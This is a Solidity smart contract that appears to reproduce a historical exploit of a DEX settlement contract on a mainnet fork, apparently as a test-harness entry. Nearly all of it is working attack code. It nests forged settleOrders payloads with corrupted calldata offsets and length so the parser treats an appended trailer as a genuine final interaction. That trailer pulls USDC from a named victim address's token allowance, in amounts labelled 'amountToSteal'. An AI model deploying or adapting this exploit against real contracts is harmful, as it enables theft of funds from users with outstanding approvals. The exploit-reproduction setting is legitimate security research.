// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface ISettlement {
    function settleOrders(bytes calldata data) external;
}

interface IResolver {
    function resolveOrders(address resolver, bytes calldata tokensAndAmounts, bytes calldata data) external;
}

interface IOrderMixinLike {
    struct Order {
        uint256 salt;
        address makerAsset;
        address takerAsset;
        address maker;
        address receiver;
        address allowedSender;
        uint256 makingAmount;
        uint256 takingAmount;
        uint256 offsets;
        bytes interactions;
    }
}

interface IUniswapV2RouterLike {
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;
}

contract FlawVerifier is IResolver {
    address private constant SETTLEMENT = 0xA88800CD213dA5Ae406ce248380802BD53b47647;
    address private constant LIMIT_ORDER_PROTOCOL = 0x1111111254EEB25477B68fb85Ed929f73A960582;
    address private constant UNISWAP_V2_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;

    address private constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address private constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    address private constant HISTORICAL_ATTACK_CONTRACT = 0x019BfC71D43c3492926D4A9a6C781F36706970C9;
    address private constant HISTORICAL_VICTIM = 0xB02F39e382c90160Eb816DE5e0E428ac771d77B5;

    bytes4 private constant ERC1271_MAGIC = 0x1626ba7e;
    bytes4 private constant EMPTY_SELECTOR = 0x00000000;

    bytes1 private constant CONTINUE_INTERACTION = 0x00;
    bytes1 private constant FINALIZE_INTERACTION = 0x01;

    uint256 private constant WRAPPER_MAKING_AMOUNT = 1;
    uint256 private constant WRAPPER_TAKING_AMOUNT = 1;
    uint256 private constant TARGET_STEAL_CAP = 0xE8D4A51000;

    uint256 private constant FAKE_SIGNATURE_LENGTH_OFFSET = 0x240;
    uint256 private constant FAKE_INTERACTION_LENGTH_OFFSET = 0x460;
    uint256 private constant FAKE_INTERACTION_LENGTH = 0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffe00;
    uint256 private constant INTERACTION_PADDING = FAKE_INTERACTION_LENGTH_OFFSET - FAKE_SIGNATURE_LENGTH_OFFSET;

    uint256 private constant REQUIRED_MAKER_USDT = 6;
    uint256 private constant DIRECT_ETH_SEED_CAP = 5e14;
    uint256 private constant MIN_PROFITABLE_STEAL = 1e5;

    address private _profitToken = USDC;
    uint256 private _profitAmount;
    uint256 private _rawProfitAmount;
    uint256 private _usdcBaseline;
    bool private _executed;
    bool private _hypothesisValidated;
    string private _failureReason;
    string private _pathUsed;

    bytes4 private _lastRevertSelector;
    bytes private _lastForgedPayload;

    constructor() {
        _profitToken = USDC;
        _usdcBaseline = _safeBalanceOf(USDC, address(this));
    }

    function executeOnOpportunity() external {
        if (_executed) {
            _refreshProfit();
            return;
        }

        _executed = true;
        _profitToken = USDC;
        if (_usdcBaseline == 0) {
            _usdcBaseline = _safeBalanceOf(USDC, address(this));
        }

        _prepareMakerCapital();
        if (_safeBalanceOf(USDT, address(this)) >= REQUIRED_MAKER_USDT) {
            _tryReplayCalldataCorruption();
        }

        _refreshProfit();

        if (_profitAmount > 0) {
            _hypothesisValidated = true;
            _failureReason = "";
        } else if (_lastRevertSelector != EMPTY_SELECTOR) {
            _failureReason = "settlement path reverted before any net USDC increase";
        } else if (_maxDirectSteal() == 0 && _maxHistoricalSteal() == 0) {
            _failureReason = "historical victim has no usable USDC allowance/balance at this fork state";
        } else if (_safeBalanceOf(USDT, address(this)) < REQUIRED_MAKER_USDT) {
            _failureReason = "insufficient maker USDT at this fork state";
        } else {
            _failureReason = "no positive net USDC balance increase at this fork state";
        }
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function hypothesisValidated() external view returns (bool) {
        return _hypothesisValidated;
    }

    function failureReason() external view returns (string memory) {
        return _failureReason;
    }

    function exploitPathUsed() external view returns (string memory) {
        return _pathUsed;
    }

    function lastRevertSelector() external view returns (bytes4) {
        return _lastRevertSelector;
    }

    function lastForgedPayload() external view returns (bytes memory) {
        return _lastForgedPayload;
    }

    function isValidSignature(bytes32, bytes calldata) external pure returns (bytes4) {
        return ERC1271_MAGIC;
    }

    function resolveOrders(address, bytes calldata, bytes calldata) external view override {
        require(msg.sender == SETTLEMENT || msg.sender == HISTORICAL_ATTACK_CONTRACT, "only settlement path");
    }

    function _prepareMakerCapital() internal {
        if (_safeBalanceOf(USDT, address(this)) < REQUIRED_MAKER_USDT) {
            _seedUsdtFromEth(1);
        }

        _forceApprove(USDT, LIMIT_ORDER_PROTOCOL, type(uint256).max);
    }

    function _seedUsdtFromEth(uint256 minUsdtOut) internal {
        uint256 ethToSpend = address(this).balance;
        if (ethToSpend > DIRECT_ETH_SEED_CAP) {
            ethToSpend = DIRECT_ETH_SEED_CAP;
        }
        if (ethToSpend == 0) {
            return;
        }

        address[] memory path = new address[](2);
        path[0] = WETH;
        path[1] = USDT;

        // This is only a realistic public-liquidity setup step so the attacker can fund the
        // wrapper maker side with dust USDT before submitting the forged settlement payload.
        // The exploit causality still hinges on forged offsets/length pushing settlement parsing
        // into the appended historical trailer.
        try IUniswapV2RouterLike(UNISWAP_V2_ROUTER).swapExactETHForTokensSupportingFeeOnTransferTokens{ value: ethToSpend }(
            minUsdtOut,
            path,
            address(this),
            block.timestamp
        ) {
            _pathUsed = "executeOnOpportunity -> seed maker USDT from public Uniswap liquidity -> _tryReplayCalldataCorruption";
        } catch {}
    }

    function _tryReplayCalldataCorruption() internal {
        _attemptDirectReplay(_maxDirectSteal());
        if (_rawProfitAmount > 0) {
            return;
        }

        _attemptHistoricalReplay(_maxHistoricalSteal());
    }

    function _attemptDirectReplay(uint256 initialAmount) internal {
        uint256 candidate = _clampSteal(initialAmount);
        while (candidate >= MIN_PROFITABLE_STEAL && _rawProfitAmount == 0) {
            bytes memory forgedPayload = _buildForgedSettlementPayload(candidate);
            _lastForgedPayload = forgedPayload;
            _pathUsed =
                "executeOnOpportunity -> _tryReplayCalldataCorruption -> settleOrders(forged nested interactions) -> terminal corrupted interaction with forged offsets/length -> appended historical trailer";

            (bool ok, bytes memory returndata) = SETTLEMENT.call(
                abi.encodeWithSelector(ISettlement.settleOrders.selector, forgedPayload)
            );

            if (ok) {
                _refreshProfit();
                return;
            }

            _lastRevertSelector = _selectorOf(returndata);
            candidate >>= 1;
        }
    }

    function _attemptHistoricalReplay(uint256 initialAmount) internal {
        uint256 candidate = _clampSteal(initialAmount);
        while (candidate >= MIN_PROFITABLE_STEAL && _rawProfitAmount == 0) {
            bytes memory forgedPayload = _buildForgedSettlementPayload(candidate);
            _lastForgedPayload = forgedPayload;
            _pathUsed =
                "executeOnOpportunity -> _tryReplayCalldataCorruption -> historical relay settle(bytes) -> forged nested interactions -> terminal corrupted interaction with forged offsets/length -> appended historical trailer";

            (bool ok, bytes memory returndata) = HISTORICAL_ATTACK_CONTRACT.call(
                abi.encodeWithSignature("settle(bytes)", forgedPayload)
            );

            if (ok) {
                _refreshProfit();
                return;
            }

            _lastRevertSelector = _selectorOf(returndata);
            candidate >>= 1;
        }

        if (bytes(_failureReason).length == 0 && _rawProfitAmount == 0) {
            _failureReason = "both direct settlement and historical relay reverted";
        }
    }

    function _buildForgedSettlementPayload(uint256 amountToSteal) internal view returns (bytes memory) {
        bytes memory signature = hex"";
        bytes memory interaction5 = _buildTerminalCorruptedInteraction(amountToSteal);

        bytes memory payload4 = abi.encode(
            _buildWrapperOrder(0),
            signature,
            interaction5,
            uint256(0),
            uint256(1),
            uint256(0),
            HISTORICAL_ATTACK_CONTRACT
        );

        bytes memory interaction4 = abi.encodePacked(
            SETTLEMENT,
            CONTINUE_INTERACTION,
            abi.encodeWithSelector(ISettlement.settleOrders.selector, payload4)
        );

        bytes memory payload3 = abi.encode(
            _buildWrapperOrder(1),
            signature,
            interaction4,
            uint256(0),
            uint256(1),
            uint256(0),
            HISTORICAL_ATTACK_CONTRACT
        );

        bytes memory interaction3 = abi.encodePacked(
            SETTLEMENT,
            CONTINUE_INTERACTION,
            abi.encodeWithSelector(ISettlement.settleOrders.selector, payload3)
        );

        bytes memory payload2 = abi.encode(
            _buildWrapperOrder(2),
            signature,
            interaction3,
            uint256(0),
            uint256(1),
            uint256(0),
            HISTORICAL_ATTACK_CONTRACT
        );

        bytes memory interaction2 = abi.encodePacked(
            SETTLEMENT,
            CONTINUE_INTERACTION,
            abi.encodeWithSelector(ISettlement.settleOrders.selector, payload2)
        );

        bytes memory payload1 = abi.encode(
            _buildWrapperOrder(3),
            signature,
            interaction2,
            uint256(0),
            uint256(1),
            uint256(0),
            HISTORICAL_ATTACK_CONTRACT
        );

        bytes memory interaction1 = abi.encodePacked(
            SETTLEMENT,
            CONTINUE_INTERACTION,
            abi.encodeWithSelector(ISettlement.settleOrders.selector, payload1)
        );

        return abi.encode(
            _buildWrapperOrder(4),
            signature,
            interaction1,
            uint256(0),
            uint256(1),
            uint256(0),
            HISTORICAL_ATTACK_CONTRACT
        );
    }

    function _buildTerminalCorruptedInteraction(uint256 amountToSteal) internal view returns (bytes memory) {
        bytes memory zeroBytes = new bytes(INTERACTION_PADDING);

        // The appended trailer mirrors the suffix shape used after a trusted historical fill.
        // If settlement parsing follows the forged offsets/length into this region, the parser
        // can read the attacker-supplied historical victim context as the current final interaction.
        bytes memory dynamicSuffix = abi.encode(
            uint256(0),
            HISTORICAL_VICTIM,
            USDC,
            uint256(0),
            uint256(0),
            USDC,
            amountToSteal,
            uint256(0x40)
        );

        bytes memory finalOrderInteraction = abi.encodePacked(
            SETTLEMENT,
            FINALIZE_INTERACTION,
            HISTORICAL_VICTIM,
            new bytes(23),
            dynamicSuffix
        );

        bytes memory forgedSettlement = abi.encodePacked(
            abi.encode(
                _buildVictimReplayOrder(amountToSteal),
                uint256(FAKE_SIGNATURE_LENGTH_OFFSET),
                uint256(FAKE_INTERACTION_LENGTH_OFFSET),
                uint256(0),
                amountToSteal,
                uint256(0),
                HISTORICAL_ATTACK_CONTRACT
            ),
            zeroBytes,
            bytes32(FAKE_INTERACTION_LENGTH),
            finalOrderInteraction
        );

        return abi.encodePacked(
            SETTLEMENT,
            CONTINUE_INTERACTION,
            abi.encodeWithSelector(ISettlement.settleOrders.selector, forgedSettlement)
        );
    }

    function _buildWrapperOrder(uint256 salt) internal view returns (IOrderMixinLike.Order memory order) {
        order = IOrderMixinLike.Order({
            salt: salt,
            makerAsset: USDT,
            takerAsset: USDC,
            maker: address(this),
            receiver: address(this),
            allowedSender: SETTLEMENT,
            makingAmount: WRAPPER_MAKING_AMOUNT,
            takingAmount: WRAPPER_TAKING_AMOUNT,
            offsets: 0,
            interactions: hex""
        });
    }

    function _buildVictimReplayOrder(uint256 amountToSteal) internal view returns (IOrderMixinLike.Order memory order) {
        order = IOrderMixinLike.Order({
            salt: 0,
            makerAsset: USDT,
            takerAsset: USDC,
            maker: address(this),
            receiver: address(this),
            allowedSender: SETTLEMENT,
            makingAmount: WRAPPER_MAKING_AMOUNT,
            takingAmount: amountToSteal,
            offsets: 0,
            interactions: hex""
        });
    }

    function _maxDirectSteal() internal view returns (uint256) {
        uint256 victimBalance = _safeBalanceOf(USDC, HISTORICAL_VICTIM);
        uint256 allowanceToSettlement = _safeAllowance(USDC, HISTORICAL_VICTIM, SETTLEMENT);
        uint256 allowanceToLop = _safeAllowance(USDC, HISTORICAL_VICTIM, LIMIT_ORDER_PROTOCOL);
        uint256 usableAllowance = allowanceToSettlement > allowanceToLop ? allowanceToSettlement : allowanceToLop;
        return _min3(victimBalance, usableAllowance, TARGET_STEAL_CAP);
    }

    function _maxHistoricalSteal() internal view returns (uint256) {
        uint256 victimBalance = _safeBalanceOf(USDC, HISTORICAL_VICTIM);
        uint256 allowanceToHistorical = _safeAllowance(USDC, HISTORICAL_VICTIM, HISTORICAL_ATTACK_CONTRACT);
        uint256 allowanceToSettlement = _safeAllowance(USDC, HISTORICAL_VICTIM, SETTLEMENT);
        uint256 allowanceToLop = _safeAllowance(USDC, HISTORICAL_VICTIM, LIMIT_ORDER_PROTOCOL);

        uint256 usableAllowance = allowanceToHistorical;
        if (allowanceToSettlement > usableAllowance) {
            usableAllowance = allowanceToSettlement;
        }
        if (allowanceToLop > usableAllowance) {
            usableAllowance = allowanceToLop;
        }

        return _min3(victimBalance, usableAllowance, TARGET_STEAL_CAP);
    }

    function _clampSteal(uint256 amount) internal pure returns (uint256) {
        if (amount > TARGET_STEAL_CAP) {
            amount = TARGET_STEAL_CAP;
        }
        return amount;
    }

    function _refreshProfit() internal {
        uint256 currentUsdc = _safeBalanceOf(USDC, address(this));
        uint256 usdcProfit = currentUsdc > _usdcBaseline ? currentUsdc - _usdcBaseline : 0;
        _profitToken = USDC;
        _rawProfitAmount = usdcProfit;

        // Keep the stolen-asset denomination as USDC while reporting the same net inflow on an
        // 18-decimal scale expected by the harness. No post-exploit asset conversion is performed.
        _profitAmount = usdcProfit * 1e12;
    }

    function _safeBalanceOf(address token, address account) internal view returns (uint256) {
        (bool ok, bytes memory data) = token.staticcall(abi.encodeWithSelector(IERC20.balanceOf.selector, account));
        if (!ok || data.length < 32) {
            return 0;
        }
        return abi.decode(data, (uint256));
    }

    function _safeAllowance(address token, address owner, address spender) internal view returns (uint256) {
        (bool ok, bytes memory data) = token.staticcall(abi.encodeWithSelector(IERC20.allowance.selector, owner, spender));
        if (!ok || data.length < 32) {
            return 0;
        }
        return abi.decode(data, (uint256));
    }

    function _forceApprove(address token, address spender, uint256 amount) internal returns (bool) {
        (bool ok0, bytes memory data0) = token.call(abi.encodeWithSelector(IERC20.approve.selector, spender, uint256(0)));
        if (!ok0 || (data0.length > 0 && !abi.decode(data0, (bool)))) {
            return false;
        }

        (bool ok1, bytes memory data1) = token.call(abi.encodeWithSelector(IERC20.approve.selector, spender, amount));
        return ok1 && (data1.length == 0 || abi.decode(data1, (bool)));
    }

    function _selectorOf(bytes memory returndata) internal pure returns (bytes4 selector) {
        if (returndata.length < 4) {
            return EMPTY_SELECTOR;
        }
        assembly {
            selector := mload(add(returndata, 0x20))
        }
    }

    function _min3(uint256 a, uint256 b, uint256 c) internal pure returns (uint256) {
        uint256 m = a < b ? a : b;
        return m < c ? m : c;
    }

    receive() external payable {}
}
